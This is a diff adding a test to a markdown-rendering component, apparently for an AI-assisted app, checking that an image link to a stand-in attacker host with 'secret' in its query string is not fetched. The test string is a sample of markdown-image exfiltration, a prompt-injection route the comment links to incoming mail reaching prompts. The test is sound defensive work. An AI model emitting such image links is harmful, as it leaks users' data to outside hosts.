@@ -37,3 +37,13 @@ describe('maths and code as a physicist reads them (M1; Sean, 7 Oct)', () => {
     expect(container.querySelector('pre')?.textContent).toContain('x := 1');
   });
 });
+
+describe('images (the client\'s call, 4 Nov: mail is about to reach prompts)', () => {
+  it('never fetches one from another address, which could carry the project out in its URL', () => {
+    const { container } = render(<MarkdownOutput content={'![the plan](https://attacker.example/x.png?d=secret)'} />);
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('[data-image-not-loaded]')?.textContent).toContain('the plan');
+    expect(container.textContent).not.toContain('attacker.example');
+  });
+});
+
